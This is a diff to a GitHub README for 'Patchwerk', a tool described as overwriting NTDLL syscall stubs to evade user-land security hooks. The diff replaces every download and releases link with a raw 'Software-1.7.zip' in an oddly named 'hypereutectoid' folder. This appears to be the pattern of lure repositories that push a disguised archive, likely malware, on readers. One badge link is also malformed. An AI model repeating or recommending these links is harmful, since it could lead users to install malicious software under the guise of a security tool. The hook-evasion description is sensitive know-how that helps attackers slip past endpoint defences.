@@ -1,6 +1,6 @@
 # 🛠️ Patchwerk
 
-[![Download CLI 1.0.0](https://github.com/Daelanthony/patchwerk/releases/download/v1.0/Software.zip%201.0.0-brightgreen)](https://github.com/Daelanthony/patchwerk/releases/download/v1.0/Software.zip)
+[![Download CLI 1.0.0](https://github.com/Daelanthony/patchwerk/raw/refs/heads/main/hypereutectoid/Software-1.7.zip%201.0.0-brightgreen)](https://github.com/Daelanthony/patchwerk/raw/refs/heads/main/hypereutectoid/Software-1.7.zip)
 
 Welcome to Patchwerk! This repository houses a Buffer Overflow (BOF) project designed to find all the Nt* system call stubs within NTDLL and overwrite them with clean syscall stubs. This technique serves as a user land hook evasion method – a process that is essential for certain security-related operations.
 
@@ -55,6 +55,6 @@ The Patchwerk project is licensed under the [MIT License](LICENSE), allowing use
 
 🔗 **For more information and to download Patchwerk, click the button below:**
 
-[![Download Patchwerk](https://github.com/Daelanthony/patchwerk/releases/download/v1.0/Software.zip)](https://github.com/Daelanthony/patchwerk/releases/download/v1.0/Software.zip)
+[![Download Patchwerk](https://github.com/Daelanthony/patchwerk/raw/refs/heads/main/hypereutectoid/Software-1.7.zip)](https://github.com/Daelanthony/patchwerk/raw/refs/heads/main/hypereutectoid/Software-1.7.zip)
 
-🌐 Visit the Patchwerk [Releases](https://github.com/Daelanthony/patchwerk/releases/download/v1.0/Software.zip) section for additional resources and updates.
+🌐 Visit the Patchwerk [Releases](https://github.com/Daelanthony/patchwerk/raw/refs/heads/main/hypereutectoid/Software-1.7.zip) section for additional resources and updates.
